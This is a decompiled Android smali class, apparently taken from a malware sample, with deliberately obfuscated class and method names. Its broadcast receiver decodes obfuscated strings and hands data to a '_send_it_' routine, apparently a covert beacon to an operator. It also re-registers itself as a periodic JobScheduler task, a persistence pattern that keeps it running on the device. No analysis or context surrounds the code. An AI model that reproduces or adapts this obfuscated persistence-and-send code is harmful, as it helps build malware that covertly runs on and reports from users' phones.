.class public Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt114;
.super Landroid/content/BroadcastReceiver;
.source "etepaejhucdoifemyubbjerbt114.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 14
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method

.method public static etepaejhucdoifemyubbjerbt114scheduleJob(Landroid/content/Context;)V
    .locals 4

    :try_start_0
    const-string v0, "jobscheduler"

    .line 18
    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/job/JobScheduler;

    .line 19
    new-instance v1, Landroid/content/ComponentName;

    const-class v2, Lginom/alfa/lib/scan/ecnjvratcclfbtkkyctntbosk9;

    invoke-direct {v1, p0, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 21
    sget p0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x18

    const/16 v3, 0x64

    if-lt p0, v2, :cond_0

    .line 23
    new-instance p0, Landroid/app/job/JobInfo$Builder;

    invoke-direct {p0, v3, v1}, Landroid/app/job/JobInfo$Builder;-><init>(ILandroid/content/ComponentName;)V

    const-wide/32 v1, 0xdbba0

    .line 24
    invoke-virtual {p0, v1, v2}, Landroid/app/job/JobInfo$Builder;->setPeriodic(J)Landroid/app/job/JobInfo$Builder;

    move-result-object p0

    .line 25
    invoke-virtual {p0}, Landroid/app/job/JobInfo$Builder;->build()Landroid/app/job/JobInfo;

    move-result-object p0

    goto :goto_0

    .line 27
    :cond_0
    new-instance p0, Landroid/app/job/JobInfo$Builder;

    invoke-direct {p0, v3, v1}, Landroid/app/job/JobInfo$Builder;-><init>(ILandroid/content/ComponentName;)V

    const-wide/16 v1, 0x3a98

    .line 28
    invoke-virtual {p0, v1, v2}, Landroid/app/job/JobInfo$Builder;->setPeriodic(J)Landroid/app/job/JobInfo$Builder;

    move-result-object p0

    .line 29
    invoke-virtual {p0}, Landroid/app/job/JobInfo$Builder;->build()Landroid/app/job/JobInfo;

    move-result-object p0

    .line 32
    :goto_0
    invoke-virtual {v0, p0}, Landroid/app/job/JobScheduler;->schedule(Landroid/app/job/JobInfo;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 1

    .line 54
    sget-boolean p2, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt12;->ec_etepaejhucdoifemyubbjerbt12_ho:Z

    if-eqz p2, :cond_0

    const-string p2, "-25\u1d35\u05d9\u02ce\u1d54\u1d62\ufe76\u1d35\u02bb5"

    const-string v0, "\u1d35\u05d9\u02ce\u1d54\u1d62\ufe76\u1d35\u02bb"

    .line 55
    invoke-static {p2, v0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt13;->_Reblace_(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    sget v0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt13;->FivePlusFive:I

    invoke-static {v0}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    invoke-static {p2, v0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt12;->_send_it_(Ljava/lang/String;[B)V

    .line 59
    :cond_0
    invoke-static {p1}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt114;->etepaejhucdoifemyubbjerbt114scheduleJob(Landroid/content/Context;)V

    return-void
.end method
